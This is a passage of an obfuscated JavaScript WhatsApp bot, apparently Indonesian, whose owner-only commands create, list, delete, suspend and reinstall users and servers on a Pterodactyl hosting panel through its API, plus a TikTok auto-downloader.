            text: "𝗕𝗘𝗥𝗜𝗞𝗨𝗧 𝗗𝗘𝗧𝗔𝗜𝗟 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔️️\n\nID: " + _0x106aaf.id + "\nEMAIL: " + _0x106aaf.email + "\nUSERNAME: " + _0x106aaf.username + "\nPASSWORD: " + _0x3207e6 + "\nEXPIRED: 1 BULAN\nCREATED AT: \n" + _0x106aaf.created_at + "\n\nWEBSITE LOGIN:\n" + domain + "\n\n*NOTE*\nHarap Login Akun Panel Setelah \n1Menit Dibuat/Dikirim Dari Bot"
          });
          _0x3fee19("𝗦𝗨𝗞𝗦𝗘𝗦 𝗠𝗘𝗠𝗕𝗨𝗔𝗧 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟\n\nID: " + _0x106aaf.id + "\nTYPE: " + _0x34b0db.object + "\nUSERNAME: " + _0x106aaf.username + "\nEMAIL: " + _0x106aaf.email + "\nNAME: " + _0x106aaf.first_name + " " + _0x106aaf.last_name + "\nLANGUAGE: " + _0x106aaf.language + "\nADMIN: " + _0x106aaf.root_admin + "\nCREATED AT: \n" + _0x106aaf.created_at + "\n\n*SEND ACCOUNT* @" + _0xd510f4.split("@")[0], [_0xd510f4]);
        }
        break;
      case "delusr":
        {
          if (!_0x446185 && !_0x540fdf) {
            return _0x2c90b0("*Fitur ini Khusus Owner/Dev*");
          }
          let _0x4c02af = q;
          if (!_0x4c02af) {
            return _0x2c90b0("ID nya mana?");
          }
          let _0x53a6bb = await fetch(global.domain + "/api/application/users/" + _0x4c02af, {
            method: "DELETE",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + global.key_plta
            }
          });
          let _0x1b43fc = await _0x53a6bb.json();
          if (_0x1b43fc.errors) {
            return _0x2c90b0(util.format(_0x1b43fc.errors[0]));
          }
          _0x2c90b0("*SUKSES DELETE USER " + _0x4c02af + "*");
        }
        break;
      case "detusr":
        {
          if (!_0x446185 && !_0x540fdf) {
            return _0x2c90b0("*Fitur ini Khusus Owner/Dev*");
          }
          let _0x3d99d1 = _0x66dd87[0];
          let _0x94a448 = await fetch(global.domain + "/api/application/users/" + _0x3d99d1, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + global.key_plta
            }
          });
          let _0x44807c = await _0x94a448.json();
          if (_0x44807c.errors) {
            return _0x2c90b0(util.format(_0x44807c.errors[0]));
          }
          let _0x1bf9a3 = _0x44807c.attributes;
          let _0x2a5e3a = "▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\n" + _0x1bf9a3.username.toUpperCase() + " USER DETAILS\n\nID: " + _0x1bf9a3.id + "\nUSERNAME: " + _0x1bf9a3.username + "\nLANGUAGE: " + _0x1bf9a3.language + "\nADMIN: " + _0x1bf9a3.root_admin + "\nEMAIL: " + _0x1bf9a3.email + "\nCREATED AT: \n " + _0x1bf9a3.created_at + "\n▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬";
          _0x2c90b0(_0x2a5e3a);
        }
        break;
      case "listusr":
        {
          if (!_0x446185 && !_0x540fdf) {
            return _0x2c90b0("*Fitur ini Khusus Owner/Dev*");
          }
          let _0x3bb259 = q ? q : "1";
          let _0x19011e = await fetch(global.domain + "/api/application/users?page=" + _0x3bb259, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + global.key_plta
            }
          });
          let _0x2c18f3 = await _0x19011e.json();
          if (_0x2c18f3.errors) {
            return _0x2c90b0(util.format(_0x2c18f3.errors[0]));
          }
          let _0x26033e = "▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\n*LIST USERS PANEL*\n□ Nama Host : " + global.nama_host + "\n□ Total Users : " + _0x2c18f3.meta.pagination.count + "\n▬▭▬▭▬▭▬▭▬▭▬▭\n";
          let _0x7dd1f8 = _0x2c18f3.data;
          let _0x26dd21 = [];
          for (let _0x2e8306 of _0x7dd1f8) {
            let _0xdc41f3 = _0x2e8306.attributes;
            let _0x10c81f = {
              id: _0xdc41f3.id,
              username: _0xdc41f3.username,
              email: _0xdc41f3.email,
              language: _0xdc41f3.language,
              root_admin: _0xdc41f3.root_admin
            };
            await _0x26dd21.push(_0x10c81f);
          }
          for (let _0x297a30 of _0x26dd21) {
            _0x26033e += "□ ID : " + _0x297a30.id + "\n□ Username : " + _0x297a30.username + "\n□ Email : " + _0x297a30.email + "\n□ Language : " + _0x297a30.language + "\n□ Status : " + (_0x297a30.root_admin ? "Admin" : "Member") + "\n▬▭▬▭▬▭▬▭▬▭▬▭\n";
          }
          _0x2c90b0(_0x26033e);
        }
        break;
      case "addsrv":
        {
          if (!_0x446185 && !_0x540fdf) {
            return _0x2c90b0("*Fitur ini Khusus Owner/Dev*");
          }
          let _0x3e8890 = q.split(",");
          if (_0x3e8890.length < 5) {
            return _0x2c90b0("username,deskripsi,userID,ram/disk,cpu");
          }
          let _0x43d0ab = _0x3e8890[0];
          let _0x6822ab = _0x3e8890[1] || "© BUYER LECCY || SERVER OVERHEAT DELETE ACCOUNT✅";
          let _0x335c96 = _0x3e8890[2];
          let _0x25b008 = _0x3e8890[3].split`/`;
          let _0x4616ef = _0x3e8890[4];
          let _0x1d70f6 = global.eggID;
          let _0x1a7aeb = global.locID;
          let _0x37adb1 = await fetch(global.domain + "/api/application/nests/5/eggs/" + _0x1d70f6, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + global.key_plta
            }
          });
          let _0x43c40b = await _0x37adb1.json();
          let _0x4fec10 = "${CMD_RUN}";
          let _0x4c4f1c = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + global.key_plta
            },
            body: JSON.stringify({
              name: _0x43d0ab,
              description: _0x6822ab,
              user: _0x335c96,
              egg: parseInt(_0x1d70f6),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_21",
              startup: "" + _0x4fec10,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: _0x25b008[0],
                swap: 0,
                disk: _0x25b008[1],
                io: 500,
                cpu: _0x4616ef
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 5
              },
              deploy: {
                locations: [parseInt(_0x1a7aeb)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x2f083f = await _0x4c4f1c.json();
          if (_0x2f083f.errors) {
            return _0x2c90b0(util.format(_0x2f083f.errors[0]));
          }
          let _0x1bed3d = _0x2f083f.attributes;
          let _0x433fcf = "𝗦𝗨𝗞𝗦𝗘𝗦 𝗠𝗘𝗠𝗕𝗨𝗔𝗧 𝗦𝗘𝗥𝗩𝗘𝗥\n\nID: " + _0x1bed3d.id + "\nTYPE: " + _0x2f083f.object + "\nNAME: " + _0x1bed3d.name + "\nMEMORY: " + (_0x1bed3d.limits.memory === 0 ? "unlimited" : _0x1bed3d.limits.memory) + " MB\nDISK: " + (_0x1bed3d.limits.disk === 0 ? "unlimited" : _0x1bed3d.limits.disk) + " MB\nCPU: " + (_0x1bed3d.limits.cpu === 0 ? "unlimited" : _0x1bed3d.limits.cpu) + "%\nEXPIRED: 1 BULAN\nDESCRIPTION: " + _0x1bed3d.description + "\nCREATED AT: \n" + _0x1bed3d.created_at + "\n";
          _0x2c90b0(_0x433fcf);
        }
        break;
      case "delsrv":
        {
          if (!_0x446185 && !_0x540fdf) {
            return _0x2c90b0("*Fitur ini Khusus Owner/Dev*");
          }
          let _0x6fb7e7 = q;
          if (!_0x6fb7e7) {
            return _0x2c90b0("Server nomor berapa yang mau di hapus?\nContoh: delsrv 1");
          }
          let _0x494502 = await fetch(global.domain + "/api/application/servers/" + _0x6fb7e7, {
            method: "DELETE",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + global.key_plta
            }
          });
          let _0x41fe15 = await _0x494502.json();
          if (_0x41fe15.errors) {
            return _0x2c90b0(util.format(_0x41fe15.errors[0]));
          }
          _0x2c90b0("SUKSES DELETE SERVER " + _0x6fb7e7);
        }
        break;
      case "reinstall":
        {
          if (!_0x446185 && !_0x540fdf) {
            return _0x2c90b0("*Fitur ini Khusus Owner/Dev*");
          }
          let _0x2e8dc4 = q;
          if (!_0x2e8dc4) {
            return _0x2c90b0("ID nya mana?");
          }
          let _0x34cd00 = await fetch(global.domain + "/api/application/servers/" + _0x2e8dc4 + "/reinstall", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + global.key_plta
            }
          });
          let _0xf86ae2 = await _0x34cd00.json();
          if (_0xf86ae2.errors) {
            return _0x2c90b0(util.format(_0xf86ae2.errors[0]));
          }
          _0x2c90b0("*SUKSES REINSTALL SERVER " + q + "*");
        }
        break;
      case "bansrv":
        {
          if (!isOwner) {
            return _0x2c90b0("Maaf Fitur Ini Khusus Owner Lexxy");
          }
          let _0x1f2d9d = q;
          if (!_0x1f2d9d) {
            return _0x2c90b0("ID nya mana?");
          }
          let _0x501191 = await fetch(global.domain + "/api/application/servers/" + _0x1f2d9d + "/suspend", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + global.key_plta
            }
          });
          let _0x121046 = await _0x501191.json();
          if (_0x121046.errors) {
            return _0x2c90b0(util.format(_0x121046.errors[0]));
          }
          _0x2c90b0("*SUKSES BANNED SERVER " + q + "*");
        }
        break;
      case "unbansrv":
        {
          if (!isOwner) {
            return _0x2c90b0("Maaf Fitur Ini Khusus Owner Lexxy");
          }
          let _0x20df14 = _0x66dd87[0];
          if (!_0x20df14) {
            return _0x2c90b0("ID nya mana?");
          }
          let _0x53c405 = await fetch(global.domain + "/api/application/servers/" + _0x20df14 + "/unsuspend", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + global.key_plta
            }
          });
          let _0x11224d = await _0x53c405.json();
          if (_0x11224d.errors) {
            return _0x2c90b0(util.format(_0x11224d.errors[0]));
          }
          _0x2c90b0("*SUKSES UNBAND SERVER " + _0x20df14 + "*");
        }
        break;
      case "detsrv":
        {
          if (!_0x446185 && !_0x540fdf) {
            return _0x2c90b0("*Fitur ini Khusus Owner/Dev*");
          }
          let _0x27ecbf = q;
          let _0x259817 = await fetch(global.domain + "/api/application/servers/" + _0x27ecbf, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + global.key_plta
            }
          });
          let _0x2df6e9 = await _0x259817.json();
          if (_0x2df6e9.errors) {
            return _0x2c90b0(util.format(_0x2df6e9.errors[0]));
          }
          let _0x3402f5 = _0x2df6e9.attributes;
          let _0x5f119b = await fetch(domain + "/api/client/servers/" + _0x3402f5.uuid.split`-`[0] + "/resources", {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + global.key_pltc
            }
          });
          let _0x5997ec = await _0x5f119b.json();
          let _0x266bfd = _0x5997ec.attributes;
          let _0x291686 = "▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\n" + _0x3402f5.name.toUpperCase() + " SERVER DETAILS\n\n● ID: " + _0x3402f5.id + "\n● NAME: " + _0x3402f5.name + "\n● MEMORY: " + (_0x3402f5.limits.memory === 0 ? "Unlimited MB" : _0x3402f5.limits.memory + "MB") + "\n● DISK: " + (_0x3402f5.limits.disk === 0 ? "Unlimited MB" : _0x3402f5.limits.disk + "MB") + "\n● CPU: " + (_0x3402f5.limits.cpu === 0 ? "Unlimited %" : _0x3402f5.limits.cpu + "%") + "\n● DESKRIPSI: " + _0x3402f5.description + "\n● CREATED AT: \n " + _0x3402f5.created_at + "\n ▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬";
          _0x2c90b0(_0x291686);
        }
        break;
      case "listsrv":
        {
          if (!_0x446185 && !_0x540fdf) {
            return _0x2c90b0("*Fitur ini Khusus Owner/Dev*");
          }
          let _0x234c29 = q ? q : "1";
          let _0x45583f = await fetch(global.domain + "/api/application/servers?page=" + _0x234c29, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + global.key_plta
            }
          });
          let _0x33a6d3 = await _0x45583f.json();
          if (_0x33a6d3.errors) {
            return _0x2c90b0(util.format(_0x33a6d3.errors[0]));
          }
          let _0x545fa0 = _0x33a6d3.data;
          let _0x54546d = [];
          let _0x7e0b3e = "▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\n*LIST SERVER PANEL*\n□ Nama Host : " + global.nama_host + "\n□ Total Server : " + _0x33a6d3.meta.pagination.count + "\n□ Page : " + _0x33a6d3.meta.pagination.current_page + "/" + _0x33a6d3.meta.pagination.total_pages + "\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n";
          for (let _0xcdf07b of _0x545fa0) {
            let _0x519545 = _0xcdf07b.attributes;
            let _0x193e5d = await fetch(domain + "/api/client/servers/resources", {
              method: "GET",
              headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + global.key_pltc
              }
            });
            let _0x2c2f3b = await _0x193e5d.json();
            let _0x4bf50d = {
              id: _0x519545.id,
              name: _0x519545.name.toLowerCase(),
              memory: _0x519545.limits.memory,
              disk: _0x519545.limits.disk,
              cpu: _0x519545.limits.cpu,
              desc: _0x519545.description.toLowerCase()
            };
            await _0x54546d.push(_0x4bf50d);
            for (let _0x1fce73 of _0x54546d) {
              _0x7e0b3e += "□ ID : " + _0x1fce73.id + "\n□ Username : " + _0x1fce73.name + "\n□ Memory : " + _0x1fce73.memory + "\n□ Disk : " + _0x1fce73.disk + "\n□ Cpu : " + _0x1fce73.cpu + "\n□ Description : " + _0x1fce73.desc + "\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n\n";
            }
          }
          _0x2c90b0(_0x7e0b3e);
        }
        break;
      default:
        if (tiktokauto && _0x2d7522.includes("tiktok.com") && _0x4a11ea != undefined) {
          if (!_0x2d7522.includes("tiktok.com")) {
            return;
          }
          if (_0x2cf499.key.fromMe) {
            return;
          }
          _0x417a71("⏳");
          let {
            Tiktok: _0x7da3d2
          } = require("./lib/tiktok");
          try {
            let _0x25cd0a = await _0x7da3d2(_0x2d7522);
            cpp = "_*> TIKTOK AUTO DOWNLOADER <*_\n\n - Author : ®LeccyOfficiall\n - Creator : " + _0x25cd0a.author + "\n \n - Title : " + _0x25cd0a.title;
            _0x134739.sendMessage(_0x1688e9, {
              video: {
                url: _0x25cd0a.nowm
              },
              caption: cpp
            }, {
              quoted: _0x2cf499
            }).then(() => _0x417a71("✅"));
          } catch (_0x25e11a) {
            await sleep(2000);
            _0x417a71("❌");
          }
        }
    }
  } catch (_0x4cba0b) {
    frm = _0x2cf499.key.remoteJid;
    stravaRorr = async () => {
      _0x134739.sendMessage(frm, {
        text: util.format(_0x4cba0b)
      });
    };
    stravaRorr();
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});
